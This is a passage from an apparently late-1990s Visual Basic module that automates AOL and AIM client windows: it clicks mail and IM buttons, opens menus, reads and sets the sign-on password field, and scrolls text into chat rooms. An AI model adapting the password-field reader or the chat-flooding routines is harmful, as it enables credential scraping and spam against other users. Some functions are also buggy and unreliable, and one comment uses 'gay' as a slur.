MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 19&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailGreetings()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long

'clicks greetings icon on write mail
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 20&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailSignOnFriend()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long

'clicks the Sign On Friend Button on write mail
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
For i& = 1& To 10&
    AOLStatic& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailAttach1()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
'clicks the first attachment button on write mail
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 15&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailAttach2()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLModal As Long

'clicks the second attachment pop up
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailOk()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long
Dim AOLModal As Long

'after second attachment pop up in write mail, this clicks ok
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 2&
    AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailCancel()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long
Dim AOLModal As Long
'clicks cancel in second attachment popup in write mail
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 3&
    AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailRead()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long
Dim AOLModal As Long
Dim AOLToolbar As Long
Dim aoltoolbar2 As Long
'read your mail
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
AOLToolbar& = FindWindowEx(AOLFrame&, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2& = FindWindowEx(AOLToolbar&, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, 0&, "_AOL_Icon", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, AOLIcon&, "_AOL_Icon", vbNullString)
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function MailWrite()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long
Dim AOLModal As Long
Dim AOLToolbar As Long
Dim aoltoolbar2 As Long

AOLFrame& = FindWindow("AOL Frame25", vbNullString)
AOLToolbar& = FindWindowEx(AOLFrame&, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2& = FindWindowEx(AOLToolbar&, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 2&
    AOLIcon& = FindWindowEx(aoltoolbar2&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function ClickIM()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long
Dim AOLModal As Long
Dim AOLToolbar As Long
Dim aoltoolbar2 As Long
'send an instant message
'plz see sub : SendImPerson
'plz see sub : SendImBody
'plz see sub : ClickImSend
'that will fill the rest in
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
AOLToolbar& = FindWindowEx(AOLFrame&, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2& = FindWindowEx(AOLToolbar&, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 4&
    AOLIcon& = FindWindowEx(aoltoolbar2&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Function SendImPerson(text As String)
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long
Dim AOLModal As Long
Dim AOLToolbar As Long
Dim aoltoolbar2 As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Send Instant Message")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
Call SendMessageByString(AOLEdit&, WM_SETTEXT, 0&, text$)
End Function

Public Function SendImBody(text As String)
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long
Dim AOLModal As Long
Dim AOLToolbar As Long
Dim aoltoolbar2 As Long
Dim richcntl As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Send Instant Message")
richcntl& = FindWindowEx(AOLChild&, 0&, "RICHCNTL", vbNullString)
Call SendMessageByString(richcntl&, WM_SETTEXT, 0&, text$)

End Function

Public Function ClickImSend()
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim AOLIcon As Long
Dim AOLButton As Long
Dim AOLStatic As Long
Dim AOLModal As Long
Dim AOLToolbar As Long
Dim aoltoolbar2 As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Send Instant Message")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 9&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessageLong(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessageLong(AOLIcon&, WM_KEYUP, VK_SPACE, 0&)

End Function

Public Sub RunToolbar(IconNumber&, letter$)
'by my bestest best friend gravity
'this runs the toolbar but only the 1 menu'd things
Dim AOLFrame As Long, menu As Long, aoltoolbar1 As Long
Dim aoltoolbar2 As Long, AOLIcon As Long, Count As Long
Dim found As Long
AOLFrame = FindWindow("aol frame25", vbNullString)
aoltoolbar1 = FindWindowEx(AOLFrame, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2 = FindWindowEx(aoltoolbar1, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon = FindWindowEx(aoltoolbar2, 0&, "_AOL_Icon", vbNullString)
For Count = 1 To IconNumber
AOLIcon = FindWindowEx(aoltoolbar2, AOLIcon, "_AOL_Icon", vbNullString)
Next Count
Call PostMessage(AOLIcon, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AOLIcon, WM_LBUTTONUP, 0&, 0&)
Do
DoEvents
menu = FindWindow("#32768", vbNullString)
found = IsWindowVisible(menu)
Loop Until found <> 0
letter = Asc(letter)
Call PostMessage(menu, WM_CHAR, letter, 0&)
End Sub
Public Sub RunToolbar2(IconNumber&, letter$, letter2$)
'by my bestest best friend gravity
'this runs the toolbar but when it clicks a letter
'and another menu opens it clicks the letter in it also
Dim AOLFrame As Long, menu As Long, aoltoolbar1 As Long
Dim aoltoolbar2 As Long, AOLIcon As Long, Count As Long
Dim found As Long
AOLFrame = FindWindow("aol frame25", vbNullString)
aoltoolbar1 = FindWindowEx(AOLFrame, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2 = FindWindowEx(aoltoolbar1, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon = FindWindowEx(aoltoolbar2, 0&, "_AOL_Icon", vbNullString)
For Count = 1 To IconNumber
AOLIcon = FindWindowEx(aoltoolbar2, AOLIcon, "_AOL_Icon", vbNullString)
Next Count
Call PostMessage(AOLIcon, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AOLIcon, WM_LBUTTONUP, 0&, 0&)
Do
DoEvents
menu = FindWindow("#32768", vbNullString)
found = IsWindowVisible(menu)
Loop Until found <> 0
letter = Asc(letter)
letter2 = Asc(letter2)
Call PostMessage(menu, WM_CHAR, letter, 0&)
Call PostMessage(menu, WM_CHAR, letter2, 0&)
End Sub

Public Function OpenScreenNames()
Call RunToolbar("3", "S")
End Function

Public Function OpenPrefrences()
Call RunToolbar("3", "P")
End Function

Public Function OpenMyDirectoryListing()
Call RunToolbar("3", "M")
End Function

Public Function OpenPasswords()
Call RunToolbar("3", "A")
End Function

Public Function OpenBilling()
Call RunToolbar("3", "B")
End Function

Public Function OpenAddressBook()
Call RunToolbar("0", "A")
End Function

Public Function OpenMailCenter()
Call RunToolbar("0", "M")
End Function

Public Function OpenRecentlyDeletedMail()
Call RunToolbar("0", "D")
End Function

Public Function OpenFilingCabnit()
Call RunToolbar("0", "F")
End Function

Public Function OpenMailWaiting2besent()
Call RunToolbar("0", "B")
End Function

Public Function OpenAutoAOL()
Call RunToolbar("0", "U")
End Function

Public Function OpenMailSignatures()
Call RunToolbar("0", "S")
End Function

Public Function OpenMailPrefrences()
Call RunToolbar("0", "5")
End Function

Public Function OpenChatNow()
Call RunToolbar("1", "N")
End Function

Public Function OpenFindAChat()
Call RunToolbar("1", "F")
End Function

Public Function OpenStartYourOwnChat()
Call RunToolbar("1", "S")
End Function

Public Function OpenLiveEvents()
Call RunToolbar("1", "E")
End Function

Public Function OpenBuddylist()
Call RunToolbar("1", "B")
End Function

Public Function OpenLocateMemOnline()
Call RunToolbar("1", "L")
End Function

Public Function OpenMessage2Pager()
Call RunToolbar("1", "M")
End Function

Public Sub Keyword(Keyword As String)
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim Combo As Long, EditWin As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    Combo& = FindWindowEx(Toolbar&, 0&, "_AOL_Combobox", vbNullString)
    EditWin& = FindWindowEx(Combo&, 0&, "Edit", vbNullString)
    Call SendMessageByString(EditWin&, WM_SETTEXT, 0&, Keyword$)
    Call SendMessageLong(EditWin&, WM_CHAR, VK_SPACE, 0&)
    Call SendMessageLong(EditWin&, WM_CHAR, VK_RETURN, 0&)
End Sub


Public Function aim_SignOn_CapChange(text As String)
'ex: Call aim_signoncapchange("New Caption")
'changes caption on the sign on screen
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Call SendMessageByString(AIMCSignOnWnd&, WM_SETTEXT, 0&, text$)
End Function

Public Function aim_SignOn_Close()
'closes sign on screen
'ex: Call aim_signonClose
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Call SendMessage(AIMCSignOnWnd&, WM_CLOSE, 0&, 0&)
End Function

Public Function aim_SignOn_Hide()
'hides the sign on screen
'ex: Call aim_SignOnHide
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Call ShowWindow(AIMCSignOnWnd&, SW_HIDE)
End Function

Public Function aim_SignOn_Maximize()
'maximizes sign on screen
'ex: Call aim_SignOnMaximize
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Call ShowWindow(AIMCSignOnWnd&, SW_MAXIMIZE)
End Function

Public Function aim_SignOn_Minimize()
'minimizes sign on screen
'ex: Call aim_SignOnMinimize
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Call ShowWindow(AIMCSignOnWnd&, SW_MINIMIZE)
End Function

Public Function aim_SignOn_Normilize()
'normilizes sign on screen
'ex: Call aim_SignOnNormilize
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Call ShowWindow(AIMCSignOnWnd&, SW_SHOWNORMAL)
End Function

Public Function aim_SignOn_Show()
'shows sign on screen
'ex: Call aim_SignOnShow
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Call ShowWindow(AIMCSignOnWnd&, SW_SHOW)
End Function

Public Function aim_SignOn_GetCap(text As String)
'gets caption of sign on screen
'ex: Text1.Text=("+aim_signongetcap+")
'something like that...
Dim AIMCSignOnWndCaption As String
Dim CaptionLength As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
CaptionLength& = GetWindowTextLength(AIMCSignOnWnd&)
AIMCSignOnWndCaption$ = String$(CaptionLength&, 0)
Call GetWindowText(AIMCSignOnWnd&, AIMCSignOnWndCaption$, (CaptionLength& + 1&))
End Function

Public Function aim_SignOn_SetFocus()
'sets focus on sign on screen
'ex: Call aim_SignOnSetFocus
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Call SetFocusAPI(AIMCSignOnWnd&)
End Function

Public Function aim_SignOn_GetPWtxt(text As String)
'gets the text from the pw field
Dim EditTxt As String
Dim TextLen As Long
Dim edit As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
edit& = FindWindowEx(AIMCSignOnWnd&, 0&, "Edit", vbNullString)
TextLen& = SendMessage(edit&, WM_GETTEXTLENGTH, 0&, 0&)
EditTxt$ = String(TextLen&, 0&)
Call SendMessageByString(edit&, WM_GETTEXT, TextLen& + 1&, EditTxt$)
End Function

Public Function aim_SignOn_SendPWtxt(text As String)
'sends text in the pw field
'ex: Call aim_SignOnSendPWtxt
Dim EditTxt As String
Dim TextLen As Long
Dim edit As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
edit& = FindWindowEx(AIMCSignOnWnd&, 0&, "Edit", vbNullString)
Call SendMessageByString(edit&, WM_SETTEXT, 0&, text$)
End Function

Public Function aim_SignOn_GetValuePW()
'gets the value of the check box for save password
'ex: Call aim_SignOnGetValuePW
Dim CbVal As Long
Dim Button As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, 0&, "Button", vbNullString)
CbVal& = SendMessage(Button&, BM_GETCHECK, 0&, vbNullString)
End Function

Public Function aim_SignOn_SavePwTrue()
'sets the save password check box to true(clicked)
Dim Button As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, 0&, "Button", vbNullString)
Call SendMessage(Button&, BM_SETCHECK, True, 0&)
End Function

Public Function aim_SignOn_SavePwFalse()
'sets the save password check box to false(unclicked)
Dim Button As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, 0&, "Button", vbNullString)
Call SendMessage(Button&, BM_SETCHECK, False, 0&)
End Function

Public Function aim_SignOn_GetAutoLogIn()
'gets the check box true or false for the auto login check
Dim CbVal As Long
Dim Button As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, 0&, "Button", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, Button&, "Button", vbNullString)
CbVal& = SendMessage(Button&, BM_GETCHECK, 0&, vbNullString)
End Function

Public Function aim_SignOn_AutoLogFalse()
'sets the auto login check to false(unchecked)
Dim Button As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, 0&, "Button", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, Button&, "Button", vbNullString)
Call SendMessage(Button&, BM_SETCHECK, False, 0&)
End Function

Public Function aim_SignOn_AutoLogTrue()
'sets the auto login check box to true(checked)
Dim Button As Long
Dim AIMCSignOnWnd As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, 0&, "Button", vbNullString)
Button& = FindWindowEx(AIMCSignOnWnd&, Button&, "Button", vbNullString)
Call SendMessage(Button&, BM_SETCHECK, True, 0&)
End Function

Public Function aim_IM_CapChange(text As String)
'this will change your IM Window Caption
'ex: Call aim_IMCapChange("new caption goes here")
Dim AIMIMessage As Long
AIMIMessage& = FindWindow("AIM_IMessage", vbNullString)
Call SendMessageByString(AIMIMessage&, WM_SETTEXT, 0&, text$)
End Function

Public Function aim_Chat_Clear()
'clears chatroom text on your computer
'ex: Call aim_chat_clear
Dim AteClass2 As Long
Dim WndAteClass As Long
Dim aimchatwnd As Long
aimchatwnd& = FindWindow("AIM_ChatWnd", vbNullString)
WndAteClass& = FindWindowEx(aimchatwnd&, 0&, "WndAte32Class", vbNullString)
AteClass2& = FindWindowEx(WndAteClass&, 0&, "Ate32Class", vbNullString)
Call SendMessageByString(WndAteClass&, WM_SETTEXT, 0&, "")
End Function

Public Function aim_Click_SignOnBtn()
'clicks the sign on button on your sign on screen
'ex: call aim_click_signOnbtn
Dim AIMCSignOnWnd As Long
Dim oscariconbtn As Long
AIMCSignOnWnd& = FindWindow("AIM_CSignOnWnd", vbNullString)
oscariconbtn& = FindWindowEx(AIMCSignOnWnd&, 0&, "_Oscar_IconBtn", vbNullString)
oscariconbtn& = FindWindowEx(AIMCSignOnWnd&, oscariconbtn&, "_Oscar_IconBtn", vbNullString)
oscariconbtn& = FindWindowEx(AIMCSignOnWnd&, oscariconbtn&, "_Oscar_IconBtn", vbNullString)

Call SendMessage(oscariconbtn&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(oscariconbtn&, WM_LBUTTONUP, 0&, 0&)

End Function

Public Function aim_Close_NewsTicker()
'closes that gay newsticker thinggy
Dim AIMScrollTickerNewsWnd As Long
AIMScrollTickerNewsWnd& = FindWindow("AIM_ScrollTickerNewsWnd", vbNullString)
Call SendMessage(AIMScrollTickerNewsWnd&, WM_CLOSE, 0&, 0&)
End Function


Public Function aim_BList_Minimize()
Dim oscarbuddylistwin As Long
oscarbuddylistwin& = FindWindow("_Oscar_BuddyListWin", vbNullString)

Call ShowWindow(oscarbuddylistwin&, SW_MINIMIZE)
End Function

Public Function aim_BList_Maximize()
Dim oscarbuddylistwin As Long
oscarbuddylistwin& = FindWindow("_Oscar_BuddyListWin", vbNullString)

Call ShowWindow(oscarbuddylistwin&, SW_MAXIMIZE)
End Function

Public Function aim_BList_Hide()
Dim oscarbuddylistwin As Long
oscarbuddylistwin& = FindWindow("_Oscar_BuddyListWin", vbNullString)

Call ShowWindow(oscarbuddylistwin&, SW_HIDE)
End Function

Public Function aim_BList_Show()
Dim oscarbuddylistwin As Long
oscarbuddylistwin& = FindWindow("_Oscar_BuddyListWin", vbNullString)

Call ShowWindow(oscarbuddylistwin&, SW_SHOW)
End Function

Public Function aim_BList_SetFocus()
Dim oscarbuddylistwin As Long
oscarbuddylistwin& = FindWindow("_Oscar_BuddyListWin", vbNullString)

Call SetFocusAPI(oscarbuddylistwin&)
End Function


Public Function aim_IM_Maximize()
Dim AIMIMessage As Long
AIMIMessage& = FindWindow("AIM_IMessage", vbNullString)

Call ShowWindow(AIMIMessage&, SW_MAXIMIZE)
End Function

Public Function aim_IM_Minimize()
Dim AIMIMessage As Long
AIMIMessage& = FindWindow("AIM_IMessage", vbNullString)
Call ShowWindow(AIMIMessage&, SW_MINIMIZE)
End Function

Public Function aim_IM_Hide()
Dim AIMIMessage As Long
AIMIMessage& = FindWindow("AIM_IMessage", vbNullString)

Call ShowWindow(AIMIMessage&, SW_HIDE)
End Function

Public Function aim_IM_Show()
Dim AIMIMessage As Long
AIMIMessage& = FindWindow("AIM_IMessage", vbNullString)

Call ShowWindow(AIMIMessage&, SW_SHOW)

End Function

Public Function aim_IM_SetFocus()
Dim AIMIMessage As Long
AIMIMessage& = FindWindow("AIM_IMessage", vbNullString)

Call SetFocusAPI(AIMIMessage&)

End Function




Public Function aim_IM_Msg(text As String)
Dim AteClass2 As Long
Dim WndAteClass As Long
Dim AIMIMessage As Long
AIMIMessage& = FindWindow("AIM_IMessage", vbNullString)
WndAteClass& = FindWindowEx(AIMIMessage&, 0&, "WndAte32Class", vbNullString)
AteClass2& = FindWindowEx(WndAteClass&, 0&, "Ate32Class", vbNullString)
Call SendMessageByString(AteClass2&, WM_SETTEXT, 0&, text$)
End Function

Public Function aim_IM_ClickSend()
Dim oscariconbtn As Long
oscariconbtn& = FindWindow("_Oscar_IconBtn", vbNullString)
Call SendMessage(oscariconbtn&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(oscariconbtn&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function aim_Aim_Close()
Dim oscarbuddylistwin As Long
oscarbuddylistwin& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Call SendMessage(oscarbuddylistwin&, WM_CLOSE, 0&, 0&)
End Function




Public Sub ChatScroll(ScrollString As String)
 'dos32
 'example on how to use ChatScroll:
 'Call ChatScroll (text1.text)
 'set your textbox to multiline, have them type things, and ChatScroll it
    Dim CurLine As String, Count As Long, ScrollIt As Long
    Dim sProgress As Long
    If FindChatRoom& = 0 Then Exit Sub
    If ScrollString$ = "" Then Exit Sub
    Count& = LineCount(ScrollString$)
    sProgress& = 1
    For ScrollIt& = 1 To Count&
        CurLine$ = LineFromString(ScrollString$, ScrollIt&)
        If Len(CurLine$) > 3 Then
            If Len(CurLine$) > 92 Then
                CurLine$ = Left(CurLine$, 92)
            End If
            Call ChatSend(CurLine$)
            Pause 0.7
        End If
        sProgress& = sProgress& + 1
        If sProgress& > 4 Then
            sProgress& = 1
            Pause 0.5
        End If
    Next ScrollIt&
End Sub

Public Function LineCount(MyString As String) As Long
  'dos32
  'just for ChatScroll
      Dim Spot As Long, Count As Long
    If Len(MyString$) < 1 Then
        LineCount& = 0&
        Exit Function
    End If
    Spot& = InStr(MyString$, Chr(13))
    If Spot& <> 0& Then
        LineCount& = 1
        Do
            Spot& = InStr(Spot + 1, MyString$, Chr(13))
            If Spot& <> 0& Then
                LineCount& = LineCount& + 1
            End If
        Loop Until Spot& = 0&
    End If
    LineCount& = LineCount& + 1
End Function
Public Function LineFromString(MyString As String, Line As Long) As String
 'dos32
 'just for ChatScroll
    Dim theline As String, Count As Long
    Dim FSpot As Long, LSpot As Long, DoIt As Long
    Count& = LineCount(MyString$)
    If Line& > Count& Then
        Exit Function
    End If
    If Line& = 1 And Count& = 1 Then
        LineFromString$ = MyString$
        Exit Function
    End If
    If Line& = 1 Then
        theline$ = Left(MyString$, InStr(MyString$, Chr(13)) - 1)
        theline$ = ReplaceString(theline$, Chr(13), "")
        theline$ = ReplaceString(theline$, Chr(10), "")
        LineFromString$ = theline$
        Exit Function
    Else
        FSpot& = InStr(MyString$, Chr(13))
        For DoIt& = 1 To Line& - 1
            LSpot& = FSpot&
            FSpot& = InStr(FSpot& + 1, MyString$, Chr(13))
        Next DoIt
        If FSpot = 0 Then
            FSpot = Len(MyString$)
        End If
        theline$ = Mid(MyString$, LSpot&, FSpot& - LSpot& + 1)
        theline$ = ReplaceString(theline$, Chr(13), "")
        theline$ = ReplaceString(theline$, Chr(10), "")
        LineFromString$ = theline$
    End If
End Function
Public Function ReplaceString(MyString As String, ToFind As String, ReplaceWith As String) As String
'dos32
'just for ChatScroll
    Dim Spot As Long, NewSpot As Long, LeftString As String
    Dim RightString As String, NewString As String
    Spot& = InStr(LCase(MyString$), LCase(ToFind))
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString$, NewSpot& - 1)
            If Spot& + Len(ToFind$) <= Len(MyString$) Then
                RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
            Else
                RightString = ""
            End If
            NewString$ = LeftString$ & ReplaceWith$ & RightString$
            MyString$ = NewString$
        Else
            NewString$ = MyString$
        End If
        Spot& = NewSpot& + Len(ReplaceWith$)
        If Spot& > 0 Then
            NewSpot& = InStr(Spot&, LCase(MyString$), LCase(ToFind$))
        End If
    Loop Until NewSpot& < 1
    ReplaceString$ = NewString$
End Function
Public Sub ChatLink(URL As String, LinkTxt As String)
'Sends a link to the room
'Example:
'Chatlink"http://www.vbfx.net","Visit vbFX, Examples, Modules & More"
ChatSend "< a href=" & Chr(34) & URL$ & Chr(34) & ">" & LinkTxt$ & "</a>"
End Sub
Public Sub ChatScrollCombo(ComboBox As ComboBox, Optional Delay As Single = "0.6")
'Scrolls a combo box contents to a room
'Example:
'Call ComboScroll(Combo1)
        Dim ComboIndex As Long
For ComboIndex& = 0 To ComboBox.ListCount - 1
Call ChatSend(ComboBox.List(ComboIndex&))
Pause Val(Delay)
Next ComboIndex&
End Sub
Public Sub ChatScrollList(List As ListBox)
'Sends listbox contents to a room
'Example:
'Call ChatScrollList(list1)
        Dim Lst As Long
For Lst = 0 To List.ListCount - 1
ChatSend List.List(Lst)
Pause 0.6
Next Lst
End Sub
Public Function GetText(WinHandle As Long) As String
